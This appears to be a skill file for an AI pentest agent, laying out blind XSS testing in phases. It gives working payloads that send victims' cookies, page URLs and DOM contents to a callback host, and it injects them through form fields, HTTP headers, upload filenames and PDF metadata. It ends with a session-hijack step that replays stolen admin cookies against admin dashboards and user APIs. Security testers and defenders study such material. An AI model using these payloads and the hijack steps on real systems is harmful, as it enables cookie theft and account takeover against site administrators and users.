---
name: vuln-blind-xss
description: "Blind XSS (out-of-band XSS) testing. Stored XSS in admin panels, log viewers, moderation queues. interactsh callback setup, injection point mapping, payload delivery via forms/headers/file metadata. Triggers: 'blind xss', 'stored xss', 'out of band xss', 'xss blind', 'admin panel xss', 'xss interactsh', 'blind xss hunter', 'bxss', 'xss log viewer'."
---

# Blind XSS (Out-of-Band XSS)

Payloads execute in unobserved contexts (admin panels, log viewers, moderation queues). Detected via OOB callbacks, not immediate browser response.

## Install

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

```

---

## Phase 1: OOB Callback Setup

```bash
interactsh-client &

CALLBACK="xxx.oast.fun"
echo "Callback: $CALLBACK"

curl -s "http://$CALLBACK/test"

```

---

## Phase 2: Map Injection Points

```bash
TARGET="https://TARGET"

# - Contact/feedback forms (reviewed by admin)
# - User profile fields (viewed in admin dashboard)
# - Comment/message fields (moderation queue)
# - Support ticket subject/body
# - Product review fields
# - File upload — filename or metadata
# - HTTP headers logged to admin console (User-Agent, Referer, X-Forwarded-For)
# - URL path (logged in admin logs)
# - Error messages (displayed in admin error tracker)
# - Invoice/order notes
# - API client name/description fields
```

---

## Phase 3: Blind XSS Payloads

```bash
CALLBACK="xxx.oast.fun"

PAYLOADS=(
  '<script src="https://CALLBACK/s"></script>'
  '"><script src="https://CALLBACK/s"></script>'
  "';document.write('<script src=\"https://CALLBACK/s\"></script>');//"
  '<img src=x onerror="this.src=`https://CALLBACK/?c=`+document.cookie">'
  '<svg onload="fetch(`https://CALLBACK/?d=`+document.domain)">'
  '"><img src=x onerror="fetch(`https://CALLBACK/xss?h=`+document.location+`&c=`+document.cookie)">'
  "<body onload=import('https://CALLBACK/')>"
)

# Rich payload (captures context):
RICH_PAYLOAD='<script>
new Image().src="https://CALLBACK/collect?"+encodeURIComponent(
  "url="+location.href+
  "&cookie="+document.cookie+
  "&dom="+document.documentElement.innerHTML.substring(0,500)
);
</script>'

for payload in "${PAYLOADS[@]}"; do
  echo "Submitting: ${payload:0:50}..."
done
```

---

## Phase 4: HTTP Header Injection

```bash
TARGET="https://TARGET"
CALLBACK="xxx.oast.fun"

XSS='<script src=https://CALLBACK/s></script>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$XSS'))")

curl -s "$TARGET/" \
  -H "User-Agent: $XSS" \
  -H "Referer: https://$CALLBACK/referer" \
  -H "X-Forwarded-For: $XSS" \
  -H "X-Custom-Header: $XSS"

curl -s "$TARGET/$(python3 -c "print('$XSS')")"
```

---

## Phase 5: File Upload Injection

```bash
CALLBACK="xxx.oast.fun"

touch $'"><script src="https://CALLBACK/s"></script>.jpg'

curl -s -X POST "$TARGET/upload" \
  -F "file=@image.jpg;filename=<script src=https://$CALLBACK/s></script>.jpg"

cp sample.pdf payload.pdf
exiftool -Title='<script src="https://CALLBACK/s"></script>' payload.pdf
exiftool -Author='"><img src=x onerror=fetch("https://CALLBACK/?c="+document.cookie)>' payload.pdf
curl -s -X POST "$TARGET/upload" -F "file=@payload.pdf"
```

---

## Phase 6: Evidence Collection and Triage

```bash
CALLBACK="xxx.oast.fun"

interactsh-client --json 2>/dev/null | while read line; do
  echo "=== Callback received ==="
  echo "$line" | jq .
  echo ""
done

# {
#   "protocol": "http",
#   "raw-request": "GET /collect?url=https%3A%2F%2F...",
#   "remote-address": "admin-browser-ip",
#   "timestamp": "..."
# }

```

---

## Phase 7: Session Hijack PoC (if admin cookies captured)

```bash
# If cookies captured via XSS callback:
STOLEN_COOKIE="session=ADMIN_SESSION_VALUE"
TARGET_ADMIN="https://admin.TARGET.com"  # discovered from url parameter

curl -s -b "$STOLEN_COOKIE" "$TARGET_ADMIN/dashboard" | head -20

curl -s -b "$STOLEN_COOKIE" "$TARGET_ADMIN/api/users" | jq '.[]' | head -10
```

---

## Payload Customization by Context

| Context | Payload |
|:--------|:--------|
| HTML attribute | `"><script src=https://CB/s></script>` |
| JavaScript value | `';document.write('<script src="https://CB/s"></script>');'` |
| URL | `javascript:fetch('https://CB/'+document.cookie)` |
| JSON value | `"<script src=https://CB/s></script>"` |
| Admin email field | `"><img src=x onerror=this.src='https://CB/?c='+document.cookie>` |

---

## Output

Save to `.omop/engagement/vuln/blind-xss/`:
- `injection-points.txt` — all tested surfaces
- `callbacks.json` — interactsh callback records
- `admin-session.txt` — captured admin cookie/URL
- `poc.txt` — reproduction steps

## Next Phase

→ `pentest-exploit` for account takeover using captured admin session
→ `pentest-report` for final report
